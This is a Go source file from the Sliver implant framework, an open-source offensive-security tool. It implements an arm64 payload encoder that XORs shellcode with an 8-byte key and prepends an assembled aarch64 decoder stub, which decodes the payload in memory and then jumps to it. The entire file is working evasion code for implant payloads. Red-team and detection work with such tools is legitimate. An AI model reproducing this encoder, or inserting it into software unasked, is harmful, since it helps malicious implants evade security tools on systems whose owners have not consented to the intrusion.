package arm64

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

import (
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/moloch--/go-keystone"
)

const (
	xorKeySize   = 8
	xorBlockSize = 8
)

// Xor encodes an arm64 payload using a basic XOR scheme and a small aarch64
// decoder stub (prepended) which decodes in-place then jumps to the payload.
func Xor(data []byte, key []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("xor encoder: empty payload")
	}
	if len(key) != xorKeySize {
		return nil, fmt.Errorf("xor encoder: invalid key length %d", len(key))
	}

	blockCount := (len(data) + xorBlockSize - 1) / xorBlockSize
	if blockCount <= 0 {
		return nil, fmt.Errorf("xor encoder: invalid block count %d", blockCount)
	}

	paddedLen := blockCount * xorBlockSize
	encoded := make([]byte, paddedLen)
	copy(encoded, data)

	for i := 0; i < paddedLen; i += xorBlockSize {
		for j := 0; j < xorKeySize; j++ {
			encoded[i+j] ^= key[j]
		}
	}

	stub, err := buildDecoderStub(blockCount, key)
	if err != nil {
		return nil, err
	}
	return append(stub, encoded...), nil
}

func buildDecoderStub(blockCount int, key []byte) ([]byte, error) {
	if blockCount <= 0 {
		return nil, fmt.Errorf("xor encoder: invalid block count %d", blockCount)
	}
	if len(key) != xorKeySize {
		return nil, fmt.Errorf("xor encoder: invalid key length %d", len(key))
	}

	engine, err := keystone.NewEngine(keystone.ARCH_ARM64, keystone.MODE_LITTLE_ENDIAN)
	if err != nil {
		return nil, err
	}
	defer func() { _ = engine.Close() }()

	keyValue := binary.LittleEndian.Uint64(key)

	var sb strings.Builder
	sb.Grow(512)

	sb.WriteString("adr x0, payload\n") // x0 = payload start
	sb.WriteString("mov x19, x0\n")     // x19 = payload base for final jump
	fmt.Fprintf(&sb, "mov w1, #%d\n", blockCount)
	emitMovImm64(&sb, "x2", keyValue) // x2 = xor key

	sb.WriteString("decode:\n")
	sb.WriteString("ldr x3, [x0]\n")
	sb.WriteString("eor x3, x3, x2\n")
	sb.WriteString("str x3, [x0], #8\n")
	sb.WriteString("subs w1, w1, #1\n")
	sb.WriteString("b.ne decode\n")
	sb.WriteString("br x19\n")
	sb.WriteString("payload:\n")

	inst, err := engine.Assemble(sb.String(), 0)
	if err != nil {
		return nil, err
	}
	if len(inst) == 0 || len(inst)%4 != 0 {
		return nil, fmt.Errorf("xor encoder: unexpected decoder stub length %d", len(inst))
	}
	return inst, nil
}

func emitMovImm64(sb *strings.Builder, reg string, imm uint64) {
	lo := uint16(imm & 0xffff)
	m16 := uint16((imm >> 16) & 0xffff)
	m32 := uint16((imm >> 32) & 0xffff)
	m48 := uint16((imm >> 48) & 0xffff)

	// Explicit movz/movk keeps the stub stable across assemblers.
	fmt.Fprintf(sb, "movz %s, #0x%X\n", reg, lo)
	fmt.Fprintf(sb, "movk %s, #0x%X, lsl #16\n", reg, m16)
	fmt.Fprintf(sb, "movk %s, #0x%X, lsl #32\n", reg, m32)
	fmt.Fprintf(sb, "movk %s, #0x%X, lsl #48\n", reg, m48)
}
